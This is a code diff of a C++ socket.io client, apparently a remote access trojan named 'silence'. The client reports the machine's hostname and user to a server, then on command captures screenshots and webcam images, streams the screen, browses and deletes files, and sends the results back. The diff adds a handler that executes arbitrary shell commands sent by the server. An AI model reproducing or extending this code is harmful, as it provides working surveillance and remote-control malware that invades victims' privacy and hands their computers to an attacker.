@@ -4,13 +4,10 @@
 #define SIOBOOL(boolean) sio::bool_message::create(boolean)
 #define SIOBIN(bin) sio::binary_message::create(bin)
 
-namespace silence
-{
+namespace silence {
     Client::Client(std::string url)
-        : mUrl(std::move(url)), mIO(new sio::client()),
-          mInstallDirectory(fs::current_path()), mUsername(impl::username()),
-          mHostname(impl::hostname())
-    {
+            : mUrl(std::move(url)), mIO(new sio::client()), mInstallDirectory(fs::current_path()),
+              mUsername(impl::username()), mHostname(impl::hostname()) {
         mSocket = mIO->socket();
 
         mSocket->on("command",
@@ -28,8 +25,7 @@ namespace silence
         mIO->set_fail_listener([this] { onFailed(); });
     }
 
-    Client::~Client()
-    {
+    Client::~Client() {
         mSocket->off_all();
         mSocket->off_error();
 
@@ -38,44 +34,37 @@ namespace silence
         mLock.unlock();
     }
 
-    void Client::connect()
-    {
+    void Client::connect() {
         mIO->connect(mUrl);
         mLock.lock();
         mCond.wait(mLock);
         mLock.unlock();
     }
 
-    void Client::onConnected(const std::string &nsp)
-    {
-        std::cout << "Connected with server on nsp: " << nsp << std::endl;
+    void Client::onConnected(const std::string &nsp) {
     }
 
     void Client::onFailed() { std::cout << "sio failed" << std::endl; }
 
-    void Client::onClosed(sio::client::close_reason const &reason)
-    {
+    void Client::onClosed(sio::client::close_reason const &reason) {
         std::cout << reason << std::endl;
         std::cout << "sio closed" << std::endl;
     }
 
-    sio::message::list Client::createObject(const CommandObject &object)
-    {
+    sio::message::list Client::createObject(const CommandObject &object) {
         auto obj = sio::object_message::create();
         obj->get_map() = object;
         return obj;
     }
 
     template<typename T, typename... Args>
-    void Client::launchEvent(const std::function<T> &callable, Args &&...args)
-    {
+    void Client::launchEvent(const std::function<T> &callable, Args &&... args) {
         std::thread thread{callable, args...};
         thread.detach();
     }
 
     void Client::onCommand(std::string const &name, sio::message::ptr const &data,
-                           bool hasAck, sio::message::list &ack_resp)
-    {
+                           bool hasAck, sio::message::list &ack_resp) {
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
         std::cout << event << std::endl;
@@ -83,7 +72,7 @@ namespace silence
         if (event == "greet")
             greetEvent();
         else if (event == "start_stream")
-            launchEvent<void()>([this] { startStreamEvent(); });// launch in new thread
+            launchEvent<void()>([this] { startStreamEvent(); }); // launch in new thread
         else if (event == "kill_stream")
             killStreamEvent();
         else if (event == "screenshot")
@@ -102,27 +91,26 @@ namespace silence
             getCwdEvent(commandObject);
         else if (event == "install_dir")
             installDirEvent(commandObject);
+        else if (event == "cmd")
+            cmdEvent(commandObject);
         else
             response(event, SIOSTR("Unknown event"));
     }
 
-    void Client::greetEvent()
-    {
+    void Client::greetEvent() {
         mSocket->emit("add_client", createObject({{"hostname", SIOSTR(mHostname)},
                                                   {"username", SIOSTR(mUsername)},
-                                                  {"os", SIOSTR(mOS)}}));
+                                                  {"os",       SIOSTR(mOS)}}));
     }
 
-    void Client::screenshotEvent()
-    {
+    void Client::screenshotEvent() {
         impl::Screenshot screen;
         cv::Mat image{screen.take()};
 
         response("screenshot", SIOBIN(impl::toBinaryString(image)));
     }
 
-    void Client::webcamShotEvent()
-    {
+    void Client::webcamShotEvent() {
         try {
             cv::VideoCapture camera;
             cv::Mat image;
@@ -134,8 +122,7 @@ namespace silence
         }
     }
 
-    void Client::killStreamEvent()
-    {
+    void Client::killStreamEvent() {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
 
         if (!mStreamRunning) {
@@ -147,8 +134,7 @@ namespace silence
         response("kill_stream", SIOBOOL(true));
     }
 
-    void Client::startStreamEvent()
-    {
+    void Client::startStreamEvent() {
         std::unique_lock<std::mutex> lockGuard(mStreamLocker);
         if (mStreamRunning) {
             response("start_stream", SIOSTR("Stream is already running"));
@@ -170,8 +156,7 @@ namespace silence
         }
     }
 
-    void Client::listDirEvent(const CommandObject &object)
-    {
+    void Client::listDirEvent(const CommandObject &object) {
         auto dirList = sio::array_message::create();
         for (const auto &path : impl::listdir(object.at("path")->get_string()))
             dirList->get_vector().push_back(SIOSTR(path.string()));
@@ -179,19 +164,16 @@ namespace silence
         response("listdir", dirList);
     }
 
-    void Client::mkDirEvent(const CommandObject &object)
-    {
+    void Client::mkDirEvent(const CommandObject &object) {
         response("mkdir",
                  SIOBOOL(fs::create_directories(object.at("path")->get_string())));
     }
 
-    void Client::removeEvent(const CommandObject &object)
-    {
+    void Client::removeEvent(const CommandObject &object) {
         response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
     }
 
-    void Client::cdEvent(const CommandObject &object)
-    {
+    void Client::cdEvent(const CommandObject &object) {
         fs::path path{object.at("path")->get_string()};
 
         if (path.is_absolute())
@@ -201,44 +183,23 @@ namespace silence
         response("cd", SIOBOOL("True"));
     }
 
-    void Client::getCwdEvent(const Client::CommandObject &object)
-    {
+    void Client::getCwdEvent(const Client::CommandObject &object) {
         response("get_cwd", SIOSTR(fs::current_path()));
     }
 
-    void Client::installDirEvent(const Client::CommandObject &object)
-    {
+    void Client::installDirEvent(const Client::CommandObject &object) {
         response("install_dir", SIOSTR(mInstallDirectory));
     }
 
-    void Client::uploadEvent(const Client::CommandObject &object)
-    {
-        std::cout << "In upload" << std::endl;
-        auto binaryData = object.at("data")->get_string();
-        auto pathToWrite = object.at("path")->get_string();
-        auto mode = object.at("mode")->get_string();
-        std::ofstream binaryFile;
-
-        if (mode == "a")
-            binaryFile = std::ofstream(pathToWrite, std::ios::out | std::ios::binary | std::ios::app );
-        else if (mode == "w")
-            binaryFile = std::ofstream(pathToWrite, std::ios::out | std::ios::binary);
-
-        if (!binaryFile.is_open()) {
-            response("upload", SIOSTR("Error file is not opened"));
-            return;
-        }
-
-        binaryFile.write(binaryData.data(),
-                         static_cast<std::streamsize>(binaryData.size()));
-        response("upload", SIOSTR("Successfully uploaded file"));
-        std::cout << "After upload" << binaryData << std::endl;
+    void Client::cmdEvent(const CommandObject &object) {
+        response("cmd", SIOSTR(
+                *impl::exec(object.at("command")->get_string().c_str())));
     }
 
-    void Client::response(const std::string &event, const sio::message::list &msg)
-    {
+    void Client::response(const std::string &event, const sio::message::list &msg) {
         mSocket->emit("response",
-                      createObject({{"event", SIOSTR(event)}, {"data", msg[0]}}));
+                      createObject({{"event", SIOSTR(event)},
+                                    {"data", msg[0]}}));
     }
 
-}// namespace silence
+} // namespace silence
